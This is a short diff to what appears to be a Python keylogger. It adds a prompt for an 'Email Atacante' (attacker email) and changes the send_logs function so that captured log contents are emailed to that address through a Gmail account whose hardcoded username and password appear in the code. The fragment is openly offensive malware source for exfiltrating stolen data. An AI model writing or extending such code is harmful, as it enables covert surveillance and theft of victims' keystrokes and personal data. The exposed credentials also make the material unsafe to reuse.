@@ -4,11 +4,14 @@ import time, os
 recoleccion = []
 global registros
 registros = 0
+global dest_email
+dest_email = input("Email Atacante")
+
 
 def send_logs(filename,date_log):
 	with open(filename, "r") as log_file:
 		logs = log_file.read()
-		create_email('sendregistros@gmail.com','enviadorderegistros123','r4ym00nd@protonmail.com','Logs : '+str(date_log),logs)
+		create_email('sendregistros@gmail.com','enviadorderegistros123',dest_email,'Logs : '+str(date_log),logs)
 	log_file.close()
 
 
